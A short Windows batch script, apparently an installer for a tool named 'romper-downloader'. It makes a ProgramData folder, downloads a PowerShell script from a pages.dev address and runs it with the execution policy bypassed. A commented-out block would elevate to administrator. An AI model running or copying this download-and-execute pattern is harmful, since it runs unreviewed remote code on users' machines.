@echo off
:: setlocal EnableDelayedExpansion

:: net session >nul 2>&1
:: if %errorLevel% neq 0 (
::    powershell -Command "Start-Process cmd -ArgumentList '/c "%~f0"' -Verb RunAs"
::    exit /b
::)

set "APP_FOLDER=%ProgramData%\romper-downloader"

if not exist "%APP_FOLDER%" mkdir "%APP_FOLDER%"

powershell -Command "Invoke-WebRequest -Uri 'https://asius.pages.dev/romperdownloader/conf.ps1' -OutFile '%APP_FOLDER%\conf.ps1'"

:: dupadupa

powershell -ExecutionPolicy Bypass -File "%APP_FOLDER%\conf.ps1"
